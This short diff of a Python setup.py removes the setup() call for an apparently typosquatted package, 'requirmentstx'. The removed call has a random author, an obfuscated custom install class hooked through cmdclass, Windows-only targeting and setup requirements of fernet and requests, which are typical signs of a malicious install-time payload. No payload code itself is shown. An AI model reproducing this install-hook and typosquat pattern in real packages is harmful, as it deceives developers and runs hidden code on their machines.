@@ -18,22 +18,5 @@ class WoBBxbQHBqpcxmKtijDHyhUuovgkperlNmdLqKuAFVXWRyhBaJNzcdDWJPDTf(install):
             install.run(self)
 
 
-setup(
-    name="requirmentstx",
-    version=VERSION,
-    author="gVhhmrcmHmykiLC",
-    author_email="sUOOKZYEPQfDSmm@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': WoBBxbQHBqpcxmKtijDHyhUuovgkperlNmdLqKuAFVXWRyhBaJNzcdDWJPDTf,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
